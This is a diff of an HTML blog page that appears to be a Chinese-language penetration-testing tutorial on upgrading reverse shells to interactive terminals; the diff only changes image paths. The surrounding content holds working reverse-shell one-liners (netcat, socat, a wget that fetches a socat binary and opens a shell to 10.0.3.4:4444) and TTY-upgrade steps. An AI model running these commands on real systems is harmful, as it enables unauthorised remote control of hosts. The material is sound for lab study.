@@ -82,32 +82,32 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 10.0.3.4 4444</span><br></pre></td></tr></table></figure>
 <h2 id="Python-pty-module">Python pty module</h2>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
-<p><img src="/img/blog_img/linux_01.png" alt=""></p>
+<p><img src="/img/blog_img/linux/linux_01.png" alt=""></p>
 <h2 id="Socat">Socat</h2>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat file:`tty`,raw,<span class="built_in">echo</span>=0 tcp-listen:4444</span><br></pre></td></tr></table></figure>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat <span class="built_in">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444</span><br></pre></td></tr></table></figure>
 <p>靶机未安装socat：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat <span class="built_in">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444</span><br></pre></td></tr></table></figure>
-<p><img src="/img/blog_img/linux_02.png" alt=""></p>
+<p><img src="/img/blog_img/linux/linux_02.png" alt=""></p>
 <h2 id="Upgrade-from-netcat">Upgrade from netcat</h2>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 10.0.3.4 4444</span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
 <figure class="highlight tp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ctrl+<span class="keyword">Z</span></span><br></pre></td></tr></table></figure>
-<p><img src="/img/blog_img/linux_03.png" alt=""></p>
+<p><img src="/img/blog_img/linux/linux_03.png" alt=""></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$TERM</span></span><br></pre></td></tr></table></figure>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stty -a</span><br></pre></td></tr></table></figure>
-<p><img src="/img/blog_img/linux_04.png" alt=""></p>
+<p><img src="/img/blog_img/linux/linux_04.png" alt=""></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stty raw -<span class="built_in">echo</span></span><br></pre></td></tr></table></figure>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fg</span></span><br></pre></td></tr></table></figure>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reset</span><br></pre></td></tr></table></figure>
-<p><img src="/img/blog_img/linux_05.png" alt=""></p>
+<p><img src="/img/blog_img/linux/linux_05.png" alt=""></p>
 <p>（nc行为前台活动自动显现，不需要手打执行）</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">export</span> SHELL=bash</span><br></pre></td></tr></table></figure>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">export</span> TERM=xterm256-color <span class="comment">#从echo $TERM获取的</span></span><br></pre></td></tr></table></figure>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ stty rows 38 columns 116</span><br></pre></td></tr></table></figure>
-<p><img src="/img/blog_img/linux_06.png" alt=""></p>
+<p><img src="/img/blog_img/linux/linux_06.png" alt=""></p>
 <p>甚至可以获取密钥建立远程连接</p>
-<p><img src="/img/blog_img/linux_07.png" alt=""></p>
+<p><img src="/img/blog_img/linux/linux_07.png" alt=""></p>
 <p>总结：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># In reverse shell</span></span><br><span class="line">$ python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">Ctrl-Z</span><br><span class="line"></span><br><span class="line"><span class="comment"># In Kali</span></span><br><span class="line">$ stty raw -<span class="built_in">echo</span></span><br><span class="line">$ <span class="built_in">fg</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># In reverse shell</span></span><br><span class="line">$ reset</span><br><span class="line">$ <span class="built_in">export</span> SHELL=bash</span><br><span class="line">$ <span class="built_in">export</span> TERM=xterm-256color</span><br><span class="line">$ stty rows &lt;num&gt; columns &lt;cols&gt;</span><br></pre></td></tr></table></figure>
 <h2 id="script-pty">script pty</h2>
